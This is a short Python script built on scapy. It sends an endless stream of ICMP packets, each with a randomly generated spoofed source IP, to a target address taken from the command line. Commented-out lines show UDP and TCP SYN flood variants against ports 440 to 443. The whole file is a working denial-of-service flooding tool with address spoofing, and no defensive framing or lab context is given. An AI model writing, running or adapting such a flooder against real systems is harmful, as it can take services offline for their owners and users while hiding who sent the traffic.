#!/usr/bin/env python

import sys
import time
from os import popen
from scapy.all import sendp, IP, UDP, Ether, TCP, ICMP
from random import randrange


def sourceIPgen():
    not_valid = [10, 127, 254, 255, 1, 2, 169, 172, 192]
    first = randrange(1, 256)
    while first in not_valid:
        first = randrange(1, 256)
        print(first)
    ip = ".".join([str(first), str(randrange(1, 256)), str(randrange(1, 256)), str(randrange(1, 256))])
    print("generated ip: " + ip)
    return ip


def main(dstIP):
    # dstIP = ".".join([str(192),str(168),str(0),str(102)])
    print(dstIP)
    src_port = 80
    dst_port = 1
    interface = popen('ifconfig | awk \'/eth0/ {print $1}\'').read()
    while True:
        #payload = 'zzzzzzzzzzzzáidsancoisnasj  caisuncp9a0cnpa9ncpac9s098 ASDASDASD5asCas5c54SC5S4c54cj s ckksankjdnh q'
        #packets = Ether() / IP(dst=dstIP, src=sourceIPgen()) / UDP(dport=dst_port, sport=src_port)
        #packets = Ether() / IP(dst=dstIP, src=sourceIPgen()) / TCP(sport=randrange(4000,55000,2),dport=[440,441,442,443],flags="S") / payload
        packets = Ether() / IP(dst=dstIP, src=sourceIPgen()) / ICMP()
        #print(repr(packets))
        sendp(packets, iface=interface.rstrip(), inter=0.025)


if __name__ == "__main__":
    main(str(sys.argv[1]))
